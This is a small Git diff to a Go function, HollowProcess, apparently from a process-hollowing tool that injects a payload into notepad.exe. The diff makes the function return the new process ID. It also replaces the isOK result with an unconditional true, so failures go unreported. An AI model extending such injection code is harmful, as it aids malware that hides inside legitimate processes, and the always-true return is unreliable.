@@ -7,7 +7,7 @@ import (
 )
 
 //HollowProcess func
-func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte []byte) bool {
+func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte []byte) (bool,int) {
 	//payloadPath := `test.exe`
 	//targetPath := `C:\Windows\SysWOW64\notepad.exe`
 
@@ -68,5 +68,5 @@ func HollowProcess(payloadPath, targetPath string, arguments string, payloadByte
 	syscall.CloseHandle(pi.Thread)
 	syscall.CloseHandle(pi.Process)
 	//---
-	return isOK
+	return true,int(pi.ProcessId)
 }
